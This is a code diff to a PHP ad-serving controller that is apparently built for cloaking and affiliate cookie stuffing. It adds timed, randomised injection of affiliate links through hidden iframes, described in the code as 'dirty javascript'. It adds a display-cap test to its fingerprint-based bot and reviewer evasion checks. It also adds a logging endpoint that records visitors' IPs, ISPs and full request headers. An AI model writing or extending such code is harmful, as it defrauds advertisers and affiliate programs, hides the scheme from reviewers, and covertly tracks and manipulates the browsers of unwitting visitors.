@@ -85,9 +85,49 @@ class Ad extends CI_Controller {
         $this->_view($id,$ad_data, $data);
     }
 
+    private function handle_js_log_data($id) {
+        $this->load->helper("ad_helper");
+        $this->load->helper("csv_helper");
+        $this->load->helper("array_helper");
+        $this->load->model("log_model");
+        $data = new Log_data();
+        $data->log_type = LOG_TYPE_JS_LOG;
+        $data->campaign_id = $id;
+        $data->client_guid = $this->input->get_post("cbuid");
+        $data->user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+        $data->date_registered = new DateTime();
+        $data->date_created = new DateTime();
+        $data->date_created->setTimestamp($this->input->get_post("ts"));
+        $data->remote_ip  = getClientIP();
+        $data->remote_port = $_SERVER['REMOTE_PORT'];
+        try{
+            $data->isp = getISPInfo($data->ip)["isp"];
+        }catch (Exception $ex) {
+            $data->isp = "unknown";
+        }
+        $data->headers = urldecode(http_build_query(getallheaders()));
+        $data->message = $this->input->get_post("txt");
+        try{
+            $this->log_model->insert($data);
+        } catch (Exception $ex) {
+            echo "error";
+            return;
+        }
+        if ($_SERVER['REQUEST_METHOD'] == "GET") {
+            header('Content-Type: image/gif');
+            echo base64_decode("R0lGODdhAQABAIAAAPxqbAAAACwAAAAAAQABAAACAkQBADs=");
+        } else {
+            echo "ok";
+        }
+    }
+
     // Shows the ad on a full html page
 	public function view($id=null)
     {
+        if (!empty($this->input->get_post("cbuid"))) {
+            $this->handle_js_log_data($id);
+            return;
+        }
         $data = $this->input->post();
         if (!empty($data)) {
             $this->load->helper("ad_helper");
@@ -117,6 +157,11 @@ class Ad extends CI_Controller {
         $this->load->helper("array_helper");
         $this->load->helper("csv_helper");
         $this->load->helper("shared_file_access_helper");
+        $this->load->model("server_settings_model");
+        /**
+         * @var server_settings $server_settings
+         */
+        $server_settings = $this->server_settings_model->get();
         $data = $this->input->post();
         if (!empty($data)) {
             handleTrafficLoggerData($id);
@@ -166,7 +211,12 @@ class Ad extends CI_Controller {
                                  window[packageName]['tool'] = tool;
                              })();
                              if (dreamsky.tool.ismobile()) {";
-        foreach($ad_data->affiliate_link_url_list as $cookieUrl) {
+        $cookieIndex = 0;
+        $cookies_list = $ad_data->affiliate_link_url_list;
+        if ($server_settings->cookies_dropping_randomize){
+            shuffle($cookies_list);
+        }
+        foreach($cookies_list as $cookieUrl) {
             if (strlen($cookieUrl) > 0) {
                 $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
                 if ($ad_data->voluumAdCycleCount > 0)
@@ -180,7 +230,9 @@ class Ad extends CI_Controller {
                 $cookieUrl = appendParameterPrefix($cookieUrl) . "campaign_id=" . $id;
                 $cookieUrl = appendParameterPrefix($cookieUrl) . $queryString;
                 // Finally. add the iframe code
-                $scriptCode .= "    dreamsky.tool.writeOffer('" . $cookieUrl. "');";
+                $delay = $server_settings->cookies_dropping_delay + $server_settings->cookies_dropping_interval*$cookieIndex;
+                $cookieIndex += 1;
+                $scriptCode .= "    setTimeout(function() {dreamsky.tool.writeOffer('" . $cookieUrl. "')},".($delay*1000).");";
             }
         }
         $scriptCode .= "} </script> ";
@@ -303,7 +355,7 @@ class Ad extends CI_Controller {
             return;
         }
 
-        // Cloack user agent
+        // Cloak user agent
         if (!preg_match('/('.$this->allowed_user_agents.')/i', $_SERVER['HTTP_USER_AGENT']))
         {
             echo $this->landing_page_cloak(8,$server_settings,false);
@@ -376,8 +428,11 @@ class Ad extends CI_Controller {
                 $affiliate_link_url_list[] = $cookieUrl;
             }
         }
+        if ($server_settings->cookies_dropping_randomize){
+            shuffle($affiliate_link_url_list);
+        }
         // Serve dirty javascript
-        echo get_js_view("cookies_loader", array('affiliate_link_url_list'=>$affiliate_link_url_list,'allowed_platforms'=>join("|", $ad_data->platform_whitelist)),false);
+        echo get_js_view("cookies_loader", array('delay'=>$server_settings->cookies_dropping_delay,'interval'=>$server_settings->cookies_dropping_interval,'affiliate_link_url_list'=>$affiliate_link_url_list,'allowed_platforms'=>join("|", $ad_data->platform_whitelist)),false);
     }
 
     private function get_redirect_code($ad_data, $redirectUrl) {
@@ -432,6 +487,11 @@ class Ad extends CI_Controller {
         $this->load->helper("array_helper");
         $this->load->helper("csv_helper");
         $this->load->helper("shared_file_access_helper");
+        $this->load->model("server_settings_model");
+        /**
+         * @var server_settings $server_settings
+         */
+        $server_settings = $this->server_settings_model->get();
 
         // Get the HTTP Referer
         $http_referer = $this->GetReferer(EMPTY_REFERER);
@@ -844,7 +904,12 @@ class Ad extends CI_Controller {
                 $cookiesCode .= "makePopunder(cookiesUrl);";
             }
             if ($ad_data->cookies_dropping_enabled && $ad_data->cookies_dropping_method == COOKIES_DROPPING_METHOD_CLOAKER) {
-                foreach($ad_data->affiliate_link_url_list as $cookieUrl) {
+                $cookieIndex = 0;
+                $cookies_list = $ad_data->affiliate_link_url_list;
+                if ($server_settings->cookies_dropping_randomize){
+                    shuffle($cookies_list);
+                }
+                foreach($cookies_list as $cookieUrl) {
                     if (strlen($cookieUrl) > 0) {
                         $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
                         if ($ad_data->voluumAdCycleCount > 0)
@@ -865,8 +930,11 @@ class Ad extends CI_Controller {
                         // Append referrer
                         $cookieUrl = appendReferrerParameter($cookieUrl);
 
+                        $delay = $server_settings->cookies_dropping_delay + $server_settings->cookies_dropping_interval*$cookieIndex;
+                        $cookieIndex += 1;
+
                         // Finally. add the iframe code
-                        $cookiesCode .= "addIframe(\"".$cookieUrl."\");";
+                        $cookiesCode .= "setTimeout(function() {addIframe(\"".$cookieUrl."\")},".($delay*1000).");";
                     }
                 }
             }
@@ -889,8 +957,9 @@ class Ad extends CI_Controller {
                             iframe.src = (url.indexOf('?') !== -1?url + '&':url + '?')+'referrer=' + encodeURIComponent(getReferrerDomain()) + '&' + location.search.substring(1);
                             iframe.sandbox = 'allow-top-navigation allow-popups allow-scripts allow-same-origin';                            
                             document.body.appendChild(iframe);
-                        }
-
+                        }\n\n".
+                        ($ad_data->js_logging?get_js_view("jslog", array("ad_data"=>$ad_data),false) : "").
+                        "\n\n
 						if (typeof jslog !== 'function')
 						{
 							jslog = function(text) { " . ($ad_data->consoleLoggingEnabled ? "console.log(text);" : "") . " }
@@ -901,6 +970,7 @@ class Ad extends CI_Controller {
                 ($ad_data->iframeCloakingEnabled ? get_js("iframetest.js") : "") .
                 ($ad_data->pluginCloakingEnabled ? get_js("plugintest.js") : "") .
                 ($ad_data->touchCloakingEnabled ? get_js("touchtest.js") : "") .
+                (($ad_data->display_cap != null && $ad_data->display_cap > 0) ? get_js_view("display_cap_test", array("ad_data"=>$ad_data),false) : "") .
                 ($ad_data->motionCloakingEnabled ? get_js("motionDetector.js")." " : "") .
                 ($ad_data->orientationCloakingEnabled ? get_js("orientationDetector.js")." " : "").
                 ($ad_data->glVendorCheckEnabled ? " var getBlockedGLVendorList = function () { return [".$ad_data->blockedGLVendors."];}; \n ". get_js("glvendorTest.js"). " " : "") .
@@ -928,17 +998,18 @@ class Ad extends CI_Controller {
 						$referrerDomainScript
 
 						function go()
-						{\n var timeoutValue = 0; \n" .
+						{\n var timeoutValue = 0; \n var redirectTimeoutValue = 0;\n" .
                 ($ad_data->motionCloakingEnabled ? "timeoutValue = Math.max(timeoutValue, motionDetector.getTimeout());\n" : "") .
                 ($ad_data->orientationCloakingEnabled ? "timeoutValue = Math.max(timeoutValue, orientationDetector.getTimeout());\n" : "") .
-                (($ad_data->redirectTimeout>0) ? "timeoutValue +=  $ad_data->redirectTimeout;\n" : "") .
+                (($ad_data->redirectTimeout>0) ? "redirectTimeoutValue = $ad_data->redirectTimeout;\n" : "") .
                 ($ad_data->trackingPixelEnabled && !empty($ad_data->trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
                 ($ad_data->iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
                 ($ad_data->pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
                 ($ad_data->touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
+                (($ad_data->display_cap != null && $ad_data->display_cap > 0) ? "testResults.push(dcTest());\n" : "") .
                 ($ad_data->canvasFingerprintCheckEnabled && !empty($ad_data->blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .
                 ($ad_data->glVendorCheckEnabled && !empty($ad_data->blockedGLVendors) ? "testResults.push(!inBlockedGLVendors());\n" : "") .
-                "jslog(testResults);
+                "jslog('CHECK:TEST_RESULTS:' + testResults);
 						   	if (testResults.every(isTrue))
 						   	{
 							   	if (/(".join("|", $ad_data->platform_whitelist).")/i.test(window.navigator.platform))
@@ -949,12 +1020,16 @@ class Ad extends CI_Controller {
                                         ($ad_data->orientationCloakingEnabled? "if (!orientationDetector.isMobileDetected()) return;\n" : "") ."
 										jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
 										var topDomain = getReferrerDomain();
-                                        
                                         $cookiesCode
-                                        
-                                        $redirectCode
-
 									}, timeoutValue);
+								    setTimeout(function()
+									{
+										".($ad_data->motionCloakingEnabled? "if (!motionDetector.isMobileDetected()) return;\n" : "") .
+                                        ($ad_data->orientationCloakingEnabled? "if (!orientationDetector.isMobileDetected()) return;\n" : "") ."
+										jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
+										var topDomain = getReferrerDomain();
+                                        $redirectCode
+									}, timeoutValue + redirectTimeoutValue);
 								}
 								else
 								{
